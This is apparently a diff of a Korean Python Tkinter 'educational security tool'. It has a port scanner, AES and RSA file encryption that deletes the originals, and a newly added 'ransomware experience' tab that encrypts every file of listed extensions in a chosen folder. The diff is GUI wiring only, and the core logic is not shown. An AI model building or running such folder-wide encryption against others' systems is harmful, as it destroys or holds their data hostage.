-        ttk.Button(port_frame, text="🚀 스캔 시작", command=self.start_scan, style='Encrypt.TButton').grid(row=2, column=0, columnspan=2, pady=(15, 10), sticky='ew', padx=5)
-        
-        ttk.Label(port_frame, text="🔍 스캔 결과 (최대 50 스레드):").grid(row=3, column=0, columnspan=2, pady=(10, 5), sticky='w')
-        self.port_result_text = tk.Text(port_frame, height=12, width=50, wrap='word', relief='groove'); self.port_result_text.grid(row=4, column=0, columnspan=2, sticky='nsew', padx=5)
-        scroll = ttk.Scrollbar(port_frame, command=self.port_result_text.yview); scroll.grid(row=4, column=2, sticky='ns'); self.port_result_text.config(yscrollcommand=scroll.set)
-        
-        port_frame.grid_columnconfigure(1, weight=1)
-        port_frame.grid_rowconfigure(4, weight=1)
-
-    def update_port_result(self, message):
-        """포트 스캔 결과를 텍스트 위젯에 추가"""
-        self.port_result_text.insert(tk.END, message); self.port_result_text.see(tk.END)
-
-    def start_scan(self):
-        """스캔 시작 및 유효성 검사"""
-        self.port_result_text.delete(1.0, tk.END) 
-        try:
-            ip = self.ip_entry.get(); start_port = int(self.port_start_entry.get()); end_port = int(self.port_end_entry.get())
-            if not 1 <= start_port <= 65535 or not 1 <= end_port <= 65535 or start_port > end_port:
-                messagebox.showerror("입력 오류", "유효한 포트 범위(1-65535)를 입력하세요."); return
-            # 스레드를 사용하여 GUI가 멈추지 않도록 함
-            threading.Thread(target=run_port_scanner, args=(ip, start_port, end_port, self.update_port_result)).start()
-        except ValueError:
-            messagebox.showerror("입력 오류", "IP 주소와 포트 번호를 확인하세요.")
-        except Exception as e:
-            messagebox.showerror("오류 발생", f"스캔 초기화 오류: {e}")
-            
-    # --- 2. AES-256 GCM (대칭키) 탭 ---
-    def create_aes_tab(self):
-        aes_frame = ttk.Frame(self.notebook, padding="15")
-        self.notebook.add(aes_frame, text="🔒 AES-256 GCM")
-        
-        aes_frame.columnconfigure(1, weight=1) 
-        
-        ttk.Label(aes_frame, text="대상 파일 경로:").grid(row=0, column=0, pady=7, padx=(0, 10), sticky='w')
-        self.aes_file_path = ttk.Entry(aes_frame, width=35); self.aes_file_path.grid(row=0, column=1, pady=7, padx=5, sticky='ew')
-        ttk.Button(aes_frame, text="📂 선택", command=lambda: self.browse_file(self.aes_file_path)).grid(row=0, column=2, padx=5)
-
-        ttk.Label(aes_frame, text="키 관리:").grid(row=1, column=0, pady=7, sticky='w')
-        key_info_frame = ttk.Frame(aes_frame)
-        key_info_frame.grid(row=1, column=1, columnspan=2, pady=7, sticky='ew')
-        ttk.Label(key_info_frame, text=f"키 파일: {AES_KEY_FILE}").pack(side='left', padx=(5, 10))
-        ttk.Button(key_info_frame, text="🔑 키 생성", command=self.generate_aes_key_gui, style='Key.TButton').pack(side='right')
-
-        ttk.Separator(aes_frame, orient='horizontal').grid(row=2, column=0, columnspan=3, sticky='ew', pady=10)
-        
-        # 암호화/복호화 버튼
-        ttk.Button(aes_frame, text="🔒 파일 암호화 (원본 삭제)", style='Encrypt.TButton', command=self.execute_aes_encrypt_thread).grid(row=3, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
-        # 🌟 성공 시 삭제 로직 재적용
-        ttk.Button(aes_frame, text="✅ 파일 복호화 (암호파일 삭제)", style='Decrypt.TButton', command=self.execute_aes_decrypt_thread).grid(row=4, column=0, pady=5, columnspan=3, sticky='ew', padx=5)
-        
-        ttk.Separator(aes_frame, orient='horizontal').grid(row=5, column=0, columnspan=3, sticky='ew', pady=10)
-        
-        # --- 진행률 표시 위젯 ---
-        self.aes_progress_var = tk.DoubleVar()
-        self.aes_status_var = tk.StringVar(value="📢 대기 중...")
-        
-        ttk.Label(aes_frame, textvariable=self.aes_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=6, column=0, columnspan=3, pady=(5, 2), sticky='w')
-        self.aes_progress_bar = ttk.Progressbar(aes_frame, orient="horizontal", length=350, mode="determinate", variable=self.aes_progress_var)
-        self.aes_progress_bar.grid(row=7, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
+        # 초기 기본 경로 설정 (폴더가 없으면 생성 시도)
+        self.set_key_directory(str(DEFAULT_BASE_DIR), is_init=True)
+        # **[추가]** AES 키 폴더 초기 설정
+        self.set_aes_key_directory(str(self.aes_key_base_dir), is_init=True)
 
 
-    def generate_aes_key_gui(self):
-        """AES 키 생성 GUI 래퍼"""
-        try:
-            os.makedirs(FIXED_KEY_DIR, exist_ok=True) 
-            key = generate_aes_key()
-            with open(AES_KEY_PATH, "wb") as f: f.write(key)
-            messagebox.showinfo("성공", f"✅ 새 AES-256 키가 '{AES_KEY_FILE}'에 저장되었습니다.\n(경로: {FIXED_KEY_DIR})")
-        except Exception as e: messagebox.showerror("오류", f"키 생성 실패: {e}")
+    # ----------------------------------------------------------------------
+    # A. 공통 유틸리티 및 경로 설정 
+    # ----------------------------------------------------------------------
 
-    def execute_aes_encrypt_thread(self):
-        """AES 암호화 스레드 시작"""
-        filename = self.aes_file_path.get()
-        key = load_aes_key()
-        if not filename: messagebox.showerror("오류", "대상 파일을 선택해주세요."); return
-        if not key: messagebox.showerror("오류", f"키 파일('{AES_KEY_FILE}')을 찾을 수 없습니다. 키를 먼저 생성하세요."); return
-        
-        progress_callback = lambda p, s: self.update_progress(self.aes_progress_var, self.aes_status_var, p, s)
-        threading.Thread(target=self._run_aes_encrypt, args=(filename, key, progress_callback)).start()
-
-    def _run_aes_encrypt(self, filename, key, progress_callback):
-        """실제 AES 암호화 로직"""
-        try:
-            output_file = encrypt_file_auto_delete_aes_gcm(filename, key, progress_callback)
-            self.master.after(0, lambda: self.show_success_message(self.aes_file_path, "암호화", output_file))
-        except FileNotFoundError: self.master.after(0, lambda: messagebox.showerror("오류", "대상 파일을 찾을 수 없습니다."))
-        except Exception as e: self.master.after(0, lambda err=e: messagebox.showerror("암호화 실패", f"오류: {err}"))
-        finally:
-            self.master.after(0, lambda: progress_callback(0, "📢 대기 중..."))
-
-
-    def execute_aes_decrypt_thread(self):
-        """AES 복호화 스레드 시작"""
-        filename = self.aes_file_path.get(); key = load_aes_key()
-        if not filename: messagebox.showerror("오류", "대상 파일을 선택해주세요."); return
-        if not key: messagebox.showerror("오류", f"키 파일('{AES_KEY_FILE}')을 찾을 수 없습니다."); return
-        
-        if not filename.lower().endswith(AES_EXT):
-            if not messagebox.askyesno("경고", f"복호화할 파일이 '{AES_EXT}' 확장자가 아닙니다.\n계속 진행하시겠습니까?"): return
-            
-        progress_callback = lambda p, s: self.update_progress(self.aes_progress_var, self.aes_status_var, p, s)
-        threading.Thread(target=self._run_aes_decrypt, args=(filename, key, progress_callback)).start()
-
-    def _run_aes_decrypt(self, filename, key, progress_callback):
-        """실제 AES 복호화 로직"""
-        try:
-            output_file = decrypt_file_auto_delete_aes_gcm(filename, key, progress_callback)
-            self.master.after(0, lambda: self.show_success_message(self.aes_file_path, "복호화", output_file))
-        
-        except InvalidTag:
-            self.master.after(0, lambda: messagebox.showerror("복호화 실패", "키가 올바르지 않거나 파일이 손상되었습니다. (AES-GCM 인증 실패)"))
-            
-        except Exception as e:
-            self.master.after(0, lambda err=e: messagebox.showerror("복호화 실패", f"예기치 않은 오류 발생: {err}"))
-            
-        finally:
-            self.master.after(0, lambda: progress_callback(0, "📢 대기 중..."))
-
-
-    # --- 3. RSA (비대칭키) 탭 ---
-    def create_rsa_tab(self):
-        rsa_frame = ttk.Frame(self.notebook, padding="15")
-        self.notebook.add(rsa_frame, text="🔑 RSA 하이브리드")
-        
-        rsa_frame.columnconfigure(1, weight=1) 
-        
-        ttk.Label(rsa_frame, text="대상 파일 경로:").grid(row=0, column=0, pady=7, padx=(0, 10), sticky='w')
-        self.rsa_file_path = ttk.Entry(rsa_frame, width=35); self.rsa_file_path.grid(row=0, column=1, pady=7, padx=5, sticky='ew')
-        ttk.Button(rsa_frame, text="📂 선택", command=lambda: self.browse_file(self.rsa_file_path)).grid(row=0, column=2, padx=5)
-
-        ttk.Label(rsa_frame, text="키 관리:").grid(row=1, column=0, pady=7, sticky='w')
-        key_info_frame = ttk.Frame(rsa_frame)
-        key_info_frame.grid(row=1, column=1, columnspan=2, pady=7, sticky='ew')
-        ttk.Label(key_info_frame, text=f"키 쌍: {PUBLIC_KEY_FILE} / {PRIVATE_KEY_FILE}").pack(side='left', padx=(5, 10))
-        ttk.Button(key_info_frame, text="🔑 키 쌍 생성", command=self.generate_rsa_key_pair_gui, style='Key.TButton').pack(side='right')
-
-        ttk.Separator(rsa_frame, orient='horizontal').grid(row=2, column=0, columnspan=3, sticky='ew', pady=10)
-
-        # 암호화/복호화 버튼
-        ttk.Button(rsa_frame, text="🔒 파일 암호화 (원본 삭제)", style='Encrypt.TButton', command=self.execute_rsa_encrypt_thread).grid(row=3, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
-        # 🌟 성공 시 삭제 로직 재적용
-        ttk.Button(rsa_frame, text="✅ 파일 복호화 (암호파일 삭제)", style='Decrypt.TButton', command=self.execute_rsa_decrypt_thread).grid(row=4, column=0, pady=5, columnspan=3, sticky='ew', padx=5)
-        
-        ttk.Separator(rsa_frame, orient='horizontal').grid(row=5, column=0, columnspan=3, sticky='ew', pady=10)
-        
-        # --- 진행률 표시 위젯 ---
-        self.rsa_progress_var = tk.DoubleVar()
-        self.rsa_status_var = tk.StringVar(value="📢 대기 중...")
-        
-        ttk.Label(rsa_frame, textvariable=self.rsa_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=6, column=0, columnspan=3, pady=(5, 2), sticky='w')
-        self.rsa_progress_bar = ttk.Progressbar(rsa_frame, orient="horizontal", length=350, mode="determinate", variable=self.rsa_progress_var)
-        self.rsa_progress_bar.grid(row=7, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
-
-
-    def generate_rsa_key_pair_gui(self):
-        """RSA 키 쌍 생성 GUI 래퍼"""
-        try:
-            pub, priv = generate_rsa_key_pair()
-            messagebox.showinfo("성공", f"✅ RSA 키 쌍이 성공적으로 생성되었습니다.\n(경로: {FIXED_KEY_DIR})")
-        except Exception as e: messagebox.showerror("오류", f"키 쌍 생성 실패: {e}")
-
-    def execute_rsa_encrypt_thread(self):
-        """RSA 하이브리드 암호화 스레드 시작"""
-        filename = self.rsa_file_path.get()
-        if not filename: messagebox.showerror("오류", "대상 파일을 선택해주세요."); return
-        
-        try:
-            pub_key = load_public_key()
-        except FileNotFoundError:
-            messagebox.showerror("오류", "공개키(public.pem)를 찾을 수 없습니다. 키 쌍을 먼저 생성하세요."); return
-        
-        progress_callback = lambda p, s: self.update_progress(self.rsa_progress_var, self.rsa_status_var, p, s)
-        threading.Thread(target=self._run_rsa_encrypt, args=(filename, pub_key, progress_callback)).start()
-
-    def _run_rsa_encrypt(self, filename, pub_key, progress_callback):
-        """실제 RSA 하이브리드 암호화 로직"""
-        try:
-            output_file = hybrid_encrypt_file_auto_delete(filename, pub_key, progress_callback)
-            self.master.after(0, lambda: self.show_success_message(self.rsa_file_path, "하이브리드 암호화", output_file))
-        except FileNotFoundError: self.master.after(0, lambda: messagebox.showerror("오류", "대상 파일을 찾을 수 없습니다."))
-        except Exception as e: self.master.after(0, lambda err=e: messagebox.showerror("암호화 실패", f"오류: {err}"))
-        finally:
-            self.master.after(0, lambda: progress_callback(0, "📢 대기 중..."))
-
-
-    def execute_rsa_decrypt_thread(self):
-        """RSA 하이브리드 복호화 스레드 시작"""
-        filename = self.rsa_file_path.get()
-        if not filename: messagebox.showerror("오류", "대상 파일을 선택해주세요."); return
-        
-        if not filename.lower().endswith(HYB_EXT): 
-            if not messagebox.askyesno("경고", f"복호화할 파일이 '{HYB_EXT}' 확장자가 아닙니다.\n계속 진행하시겠습니까?"): return
-            
-        try:
-            priv_key = load_private_key()
-        except FileNotFoundError:
-            messagebox.showerror("오류", "개인키(private.pem)를 찾을 수 없습니다. 키 쌍을 먼저 생성하세요."); return
-        
-        progress_callback = lambda p, s: self.update_progress(self.rsa_progress_var, self.rsa_status_var, p, s)
-        threading.Thread(target=self._run_rsa_decrypt, args=(filename, priv_key, progress_callback)).start()
-
-    def _run_rsa_decrypt(self, filename, priv_key, progress_callback):
-        """실제 RSA 하이브리드 복호화 로직"""
-        try:
-            output_file = hybrid_decrypt_file_auto_delete(filename, priv_key, progress_callback)
-            self.master.after(0, lambda: self.show_success_message(self.rsa_file_path, "하이브리드 복호화", output_file))
-        
-        except InvalidTag: 
-            self.master.after(0, lambda: messagebox.showerror("복호화 실패", "개인키가 올바르지 않거나 암호화 파일이 손상되었습니다. (AES-GCM 인증 실패)"))
-            
-        except Exception as e: 
-            self.master.after(0, lambda err=e: messagebox.showerror("복호화 실패", f"예기치 않은 오류 발생: {err}"))
-            
-        finally:
-            self.master.after(0, lambda: progress_callback(0, "📢 대기 중..."))
-
-
-    # --- 4. 제작자 정보 탭 ---
-    def create_developer_tab(self):
-        dev_frame = ttk.Frame(self.notebook, padding="15")
-        self.notebook.add(dev_frame, text="💡 제작자 정보")
-        
-        # 폰트 스타일 적용
-        TITLE_FONT = ('Malgun Gothic', 13, 'bold')
-        HEADER_FONT = ('Malgun Gothic', 11, 'bold')
-        TEXT_FONT = ('Malgun Gothic', 10)
-        
-        ttk.Label(dev_frame, text="--- 🛡️ 교육용 파이썬 보안 도구 (V2.0) ---", font=TITLE_FONT, foreground='#3F51B5').pack(pady=(10, 5)) 
-        ttk.Label(dev_frame, text="프로젝트: 통합 파일 암호화 및 네트워크 보안 학습용 도구", font=TEXT_FONT).pack(pady=2, anchor='w')
-        ttk.Label(dev_frame, text="제작자: Dangel", font=HEADER_FONT).pack(pady=5, anchor='w')
-        
-        ttk.Separator(dev_frame, orient='horizontal').pack(fill='x', pady=10)
-
-        ttk.Label(dev_frame, text="📚 개발 배경 및 학습 과정", font=HEADER_FONT).pack(pady=5, anchor='w')
-        
-        text_container = ttk.Frame(dev_frame)
-        text_container.pack(fill='both', expand=True, pady=5) 
-        info_text = tk.Text(text_container, height=10, width=50, wrap='word', bd=1, relief='flat', font=TEXT_FONT, background='#f5f5f5') 
-        scroll = ttk.Scrollbar(text_container, command=info_text.yview)
-        info_text.config(yscrollcommand=scroll.set)
-        
-        scroll.pack(side='right', fill='y')
-        info_text.pack(side='left', fill='both', expand=True) 
-
-        info_text.insert(tk.END, "이 도구는 보안도구 공부를 하기위해 만든것입니다. 학습에 도움이 되기를 바랍니다.\n\n")
-        info_text.insert(tk.END, "📅 최근 업데이트: 2025_11_10 RSA와 Fernet(AES)의 파일 이름이 확장자가 없어지거나 내용이 없어지면서 복호화되는 버그를 수정했습니다.\n")
-        info_text.insert(tk.END, "💡 주요 업데이트: 대용량 파일 멈춤 현상 방지를 위한 청크 스트리밍 도입 및 진행률 표시 기능 추가 .\n\n")
-        info_text.insert(tk.END, "⚠️ 책임 고지: 이 도구는 교육 및 학습 목적으로만 사용해야 합니다. 타인의 컴퓨터에 악용하여 발생하는 모든 피해는 사용자 본인의 책임입니다.\n\n")
-        info_text.insert(tk.END, "주요 학습 내용:\n")
-        info_text.insert(tk.END, "    - 비동기 멀티스레딩을 활용한 포트 스캐너 구현\n")
-        info_text.insert(tk.END, "    - AES-256 GCM 대칭키 스트리밍 암호화\n")
-        info_text.insert(tk.END, "    - RSA(비대칭키) 하이브리드 암호화 로직 및 키 관리\n")
-        
-        info_text.config(state='disabled') 
-        
-        ttk.Label(dev_frame, text="📢 제작자도 현재 배우는 중입니다. 오류 보고 및 피드백은 언제나 환영합니다.", foreground='#007BFF', font=('Malgun Gothic', 10, 'italic')).pack(pady=10)
-
-    # --- 공통 유틸리티 ---
     def browse_file(self, entry_widget):
         """파일 선택 대화 상자를 열고 경로를 엔트리 위젯에 채움"""
         file_path = filedialog.askopenfilename()
         if file_path:
             entry_widget.delete(0, tk.END)
             entry_widget.insert(0, file_path)
+
+    def browse_directory(self, entry_widget):
+        """폴더 선택 대화 상자를 열고 경로를 엔트리 위젯에 채움"""
+        dir_path = filedialog.askdirectory()
+        if dir_path:
+            entry_widget.delete(0, tk.END)
+            entry_widget.insert(0, dir_path)
             
-    def show_success_message(self, entry_widget, operation_type, output_file):
+    def set_key_directory(self, path_str, is_init=False):
         """
-        성공 메시지를 띄우고 입력 필드를 최종 결과 파일 경로로 업데이트합니다.
+        사용자가 지정한 경로를 RSA 키 파일의 기본 저장 경로로 설정하고 폴더를 생성합니다.
         """
+        if not path_str:
+            if not is_init: messagebox.showerror("오류", "유효한 경로를 입력해야 합니다.");
+            return False
+            
+        try:
+            new_path = pathlib.Path(path_str).resolve()
+            new_path.mkdir(parents=True, exist_ok=True)
+                
+            self.key_base_dir = new_path
+            
+            # --- UI 업데이트 ---
+            if hasattr(self, 'rsa_key_dir_path'): 
+                self.rsa_key_dir_path.delete(0, tk.END)
+                self.rsa_key_dir_path.insert(0, str(self.key_base_dir))
+            
+            if hasattr(self, 'ransom_key_info_label'):
+                self.ransom_key_info_label.config(text=f"RSA 키 쌍은 '{self.key_base_dir}' 경로에 있어야 합니다.")
+
+            if not is_init:
+                messagebox.showinfo("경로 설정 완료", f"RSA 키 파일 저장 경로가 다음으로 설정되었습니다:\n{self.key_base_dir}")
+            return True
+        except Exception as e:
+            if not is_init: messagebox.showerror("경로 설정 오류", f"유효하지 않은 경로입니다. 폴더 생성 실패: {e}");
+            return False
+
+    def set_aes_key_directory(self, path_str, is_init=False):
+        """
+        **[추가]** 사용자가 지정한 경로를 AES 키 파일의 저장 경로로 설정하고 폴더를 생성합니다.
+        """
+        if not path_str:
+            if not is_init: messagebox.showerror("오류", "유효한 경로를 입력해야 합니다.");
+            return False
+            
+        try:
+            new_path = pathlib.Path(path_str).resolve()
+            new_path.mkdir(parents=True, exist_ok=True)
+                
+            self.aes_key_base_dir = new_path
+            
+            # --- UI 업데이트 ---
+            if hasattr(self, 'aes_key_dir_path'): 
+                self.aes_key_dir_path.delete(0, tk.END)
+                self.aes_key_dir_path.insert(0, str(self.aes_key_base_dir))
+
+            if hasattr(self, 'aes_key_info_label'):
+                self.aes_key_info_label.config(text=f"**🔑 AES 키/IV 저장 경로: '{self.aes_key_base_dir}'**")
+            
+            if not is_init:
+                messagebox.showinfo("AES 경로 설정 완료", f"AES 키 파일 저장 경로가 다음으로 설정되었습니다:\n{self.aes_key_base_dir}")
+            return True
+        except Exception as e:
+            if not is_init: messagebox.showerror("AES 경로 설정 오류", f"유효하지 않은 경로입니다. 폴더 생성 실패: {e}");
+            return False
+
+
+    def update_progress(self, progress_var, status_var, percentage, message):
+        """GUI의 진행률 및 상태 메시지를 업데이트합니다."""
+        self.master.after(0, progress_var.set, percentage)
+        self.master.after(0, status_var.set, message)
+
+    # ----------------------------------------------------------------------
+    # B. 탭 구성 메서드 
+    # ----------------------------------------------------------------------
+    
+    # --- 1. 포트 스캐너 탭 ---
+    def create_port_scanner_tab(self):
+        port_frame = ttk.Frame(self.notebook, padding="15")
+        self.notebook.add(port_frame, text="📡 포트 스캐너")
         
-        # 1. 기존 내용 삭제
-        entry_widget.delete(0, tk.END) 
+        port_frame.columnconfigure(1, weight=1) 
         
-        # 2. 최종 결과 파일 경로를 필드에 다시 채웁니다.
-        entry_widget.insert(0, output_file) 
+        ttk.Label(port_frame, text="대상 IP 주소:").grid(row=0, column=0, pady=5, padx=(0, 10), sticky='w')
+        self.target_ip_entry = ttk.Entry(port_frame, width=35); self.target_ip_entry.grid(row=0, column=1, pady=5, sticky='ew', columnspan=2, padx=5)
+
+        ttk.Label(port_frame, text="시작 포트:").grid(row=1, column=0, pady=5, sticky='w')
+        self.start_port_entry = ttk.Entry(port_frame, width=10); self.start_port_entry.grid(row=1, column=1, pady=5, sticky='w', padx=5)
+
+        ttk.Label(port_frame, text="끝 포트:").grid(row=2, column=0, pady=5, sticky='w')
+        self.end_port_entry = ttk.Entry(port_frame, width=10); self.end_port_entry.grid(row=2, column=1, pady=5, sticky='w', padx=5)
         
-        # 3. 메시지 박스 표시
-        if operation_type.startswith("암호화"):
-            icon = "🔒"
-            msg = f"{icon} 파일이 성공적으로 {operation_type}되었으며, 원본 파일이 삭제되었습니다.\n출력: {os.path.basename(output_file)}"
+        ttk.Button(port_frame, text="🔍 포트 스캔 시작", style='Scan.TButton', command=self.execute_scan_thread).grid(row=3, column=0, columnspan=3, pady=15, sticky='ew', padx=5)
+
+        # 결과 표시 영역
+        ttk.Label(port_frame, text="[스캔 결과]").grid(row=4, column=0, columnspan=3, pady=(5, 0), sticky='w')
+        self.result_text = tk.Text(port_frame, height=10, width=50, state='disabled')
+        self.result_text.grid(row=5, column=0, columnspan=3, pady=5, sticky='nsew', padx=5)
+        
+        port_frame.grid_rowconfigure(5, weight=1)
+        
+        # 진행률 표시
+        self.scan_status_var = tk.StringVar(value="📢 대기 중...")
+        ttk.Label(port_frame, textvariable=self.scan_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=6, column=0, columnspan=3, pady=(5, 2), sticky='w')
+        self.scan_progress_var = tk.DoubleVar()
+        ttk.Progressbar(port_frame, orient="horizontal", length=350, mode="determinate", variable=self.scan_progress_var).grid(row=7, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
+
+
+    # --- 2. AES 암호화/복호화 탭 ---
+    def create_aes_tab(self):
+        aes_frame = ttk.Frame(self.notebook, padding="15")
+        self.notebook.add(aes_frame, text="🔒 AES 암호화")
+        
+        aes_frame.columnconfigure(1, weight=1) 
+        
+        # --- 키 저장 경로 설정 UI ---
+        ttk.Label(aes_frame, text="키 저장 경로 설정:", font=('Malgun Gothic', 10, 'bold')).grid(row=0, column=0, columnspan=3, pady=(5, 5), sticky='w')
+        
+        self.aes_key_dir_path = ttk.Entry(aes_frame, width=35)
+        self.aes_key_dir_path.grid(row=1, column=0, pady=7, padx=(0, 5), sticky='ew', columnspan=2)
+        self.aes_key_dir_path.insert(0, str(self.aes_key_base_dir)) 
+        
+        ttk.Button(aes_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.aes_key_dir_path)).grid(row=1, column=2, padx=5)
+        ttk.Button(aes_frame, text="✅ 경로 설정/적용", command=lambda: self.set_aes_key_directory(self.aes_key_dir_path.get())).grid(row=2, column=0, columnspan=3, pady=(5, 10), sticky='ew', padx=5)
+
+        ttk.Separator(aes_frame, orient='horizontal').grid(row=3, column=0, columnspan=3, sticky='ew', pady=10)
+
+        # --- 파일 선택 UI ---
+        ttk.Label(aes_frame, text="대상 파일 경로:").grid(row=4, column=0, pady=7, padx=(0, 10), sticky='w')
+        self.aes_file_path = ttk.Entry(aes_frame, width=35); self.aes_file_path.grid(row=4, column=1, pady=7, padx=5, sticky='ew')
+        ttk.Button(aes_frame, text="📁 파일 선택", command=lambda: self.browse_file(self.aes_file_path)).grid(row=4, column=2, padx=5)
+
+        ttk.Button(aes_frame, text="🔐 파일 암호화 (AES)", style='Encrypt.TButton', command=self.execute_aes_encrypt_thread).grid(row=5, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
+        ttk.Button(aes_frame, text="🔓 파일 복호화 (AES)", style='Decrypt.TButton', command=self.execute_aes_decrypt_thread).grid(row=6, column=0, pady=5, columnspan=3, sticky='ew', padx=5)
+        
+        ttk.Separator(aes_frame, orient='horizontal').grid(row=7, column=0, columnspan=3, sticky='ew', pady=10)
+        
+        # --- 진행률 표시 위젯 ---
+        self.aes_progress_var = tk.DoubleVar()
+        self.aes_status_var = tk.StringVar(value="📢 대기 중...")
+        
+        ttk.Label(aes_frame, textvariable=self.aes_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=8, column=0, columnspan=3, pady=(5, 2), sticky='w')
+        ttk.Progressbar(aes_frame, orient="horizontal", length=350, mode="determinate", variable=self.aes_progress_var).grid(row=9, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
+        
+        # AES 키 정보 안내 
+        self.aes_key_info_label = ttk.Label(aes_frame, text=f"**🔑 AES 키/IV 저장 경로: '{self.aes_key_base_dir}'**", foreground='#5D4037')
+        self.aes_key_info_label.grid(row=10, column=0, columnspan=3, pady=5, sticky='w')
+
+
+    # --- 3. RSA 키 관리 및 암호화 탭  ---
+    def create_rsa_tab(self):
+        rsa_frame = ttk.Frame(self.notebook, padding="15")
+        self.notebook.add(rsa_frame, text="🔑 RSA 키/암호화")
+        
+        rsa_frame.columnconfigure(1, weight=1) 
+        
+        # --- 경로 설정 UI ---
+        ttk.Label(rsa_frame, text="**키 저장 기본 경로 설정:**", font=('Malgun Gothic', 10, 'bold')).grid(row=0, column=0, columnspan=3, pady=(5, 5), sticky='w')
+        
+        self.rsa_key_dir_path = ttk.Entry(rsa_frame, width=35)
+        self.rsa_key_dir_path.grid(row=1, column=0, pady=7, padx=(0, 5), sticky='ew', columnspan=2)
+        self.rsa_key_dir_path.insert(0, str(self.key_base_dir)) 
+        
+        ttk.Button(rsa_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.rsa_key_dir_path)).grid(row=1, column=2, padx=5)
+        ttk.Button(rsa_frame, text="✅ 경로 설정/적용", command=lambda: self.set_key_directory(self.rsa_key_dir_path.get())).grid(row=2, column=0, columnspan=3, pady=(5, 10), sticky='ew', padx=5)
+
+        ttk.Separator(rsa_frame, orient='horizontal').grid(row=3, column=0, columnspan=3, sticky='ew', pady=10)
+
+        # RSA 키 생성 버튼
+        ttk.Button(rsa_frame, text="✨ RSA 4096bit 키 쌍 생성", style='Encrypt.TButton', command=self.execute_rsa_key_pair_thread).grid(row=4, column=0, columnspan=3, pady=(5, 15), sticky='ew', padx=5)
+        
+        ttk.Separator(rsa_frame, orient='horizontal').grid(row=5, column=0, columnspan=3, sticky='ew', pady=10)
+
+        # RSA 파일 암호화 섹션
+        ttk.Label(rsa_frame, text="대상 파일 경로:").grid(row=6, column=0, pady=7, padx=(0, 10), sticky='w')
+        self.rsa_file_path = ttk.Entry(rsa_frame, width=35); self.rsa_file_path.grid(row=6, column=1, pady=7, padx=5, sticky='ew')
+        ttk.Button(rsa_frame, text="📁 파일 선택", command=lambda: self.browse_file(self.rsa_file_path)).grid(row=6, column=2, padx=5)
+
+        ttk.Button(rsa_frame, text="🔐 파일 암호화 (RSA 공개키 사용)", style='Encrypt.TButton', command=self.execute_rsa_encrypt_thread).grid(row=7, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
+        ttk.Button(rsa_frame, text="🔓 파일 복호화 (RSA 개인키 사용)", style='Decrypt.TButton', command=self.execute_rsa_decrypt_thread).grid(row=8, column=0, pady=5, columnspan=3, sticky='ew', padx=5)
+
+        # --- 진행률 표시 위젯 ---
+        ttk.Separator(rsa_frame, orient='horizontal').grid(row=9, column=0, columnspan=3, sticky='ew', pady=10)
+        self.rsa_progress_var = tk.DoubleVar()
+        self.rsa_status_var = tk.StringVar(value="📢 대기 중...")
+        
+        ttk.Label(rsa_frame, textvariable=self.rsa_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=10, column=0, columnspan=3, pady=(5, 2), sticky='w')
+        ttk.Progressbar(rsa_frame, orient="horizontal", length=350, mode="determinate", variable=self.rsa_progress_var).grid(row=11, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
+
+
+    # --- 4. 랜섬웨어 체험 탭 (유지) ---
+    def create_ransomware_tab(self):
+        ransom_frame = ttk.Frame(self.notebook, padding="15")
+        self.notebook.add(ransom_frame, text="😈 랜섬웨어 체험")
+        
+        ransom_frame.columnconfigure(1, weight=1) 
+        
+        ttk.Label(ransom_frame, text="대상 폴더 경로:").grid(row=0, column=0, pady=7, padx=(0, 10), sticky='w')
+        self.ransom_dir_path = ttk.Entry(ransom_frame, width=35); self.ransom_dir_path.grid(row=0, column=1, pady=7, padx=5, sticky='ew')
+        ttk.Button(ransom_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.ransom_dir_path)).grid(row=0, column=2, padx=5)
+
+        ttk.Label(ransom_frame, text="암호화 대상 확장자:").grid(row=1, column=0, pady=7, sticky='w')
+        ext_label = ttk.Label(ransom_frame, text=", ".join(RANSOM_EXTS).upper(), foreground='#D32F2F', font=('Malgun Gothic', 10, 'bold'))
+        ext_label.grid(row=1, column=1, columnspan=2, pady=7, sticky='w')
+        
+        ttk.Separator(ransom_frame, orient='horizontal').grid(row=2, column=0, columnspan=3, sticky='ew', pady=10)
+
+        # 핵심 기능 버튼
+        ttk.Button(ransom_frame, text="🔥 폴더 내 파일 암호화 (RSA 하이브리드)", style='Encrypt.TButton', command=self.execute_ransom_encrypt_thread).grid(row=3, column=0, pady=(15, 5), columnspan=3, sticky='ew', padx=5)
+        ttk.Button(ransom_frame, text="🔑 폴더 내 파일 복호화 (RSA 하이브리드)", style='Decrypt.TButton', command=self.execute_ransom_decrypt_thread).grid(row=4, column=0, pady=5, columnspan=3, sticky='ew', padx=5)
+        
+        ttk.Separator(ransom_frame, orient='horizontal').grid(row=5, column=0, columnspan=3, sticky='ew', pady=10)
+        
+        # --- 진행률 표시 위젯 ---
+        self.ransom_progress_var = tk.DoubleVar()
+        self.ransom_status_var = tk.StringVar(value="📢 대기 중...")
+        
+        ttk.Label(ransom_frame, textvariable=self.ransom_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=6, column=0, columnspan=3, pady=(5, 2), sticky='w')
+        self.ransom_progress_bar = ttk.Progressbar(ransom_frame, orient="horizontal", length=350, mode="determinate", variable=self.ransom_progress_var)
+        self.ransom_progress_bar.grid(row=7, column=0, columnspan=3, pady=5, sticky='ew', padx=5)
+        
+        # RSA 키 관리 안내 
+        self.ransom_key_info_label = ttk.Label(ransom_frame, text=f"**RSA 키 쌍은 '{self.key_base_dir}' 경로에 있어야 합니다.**", foreground='#5D4037')
+        self.ransom_key_info_label.grid(row=8, column=0, columnspan=3, pady=5, sticky='w')
+
+
+    # --- 5. 위협 요소 체험 탭 (유지) ---
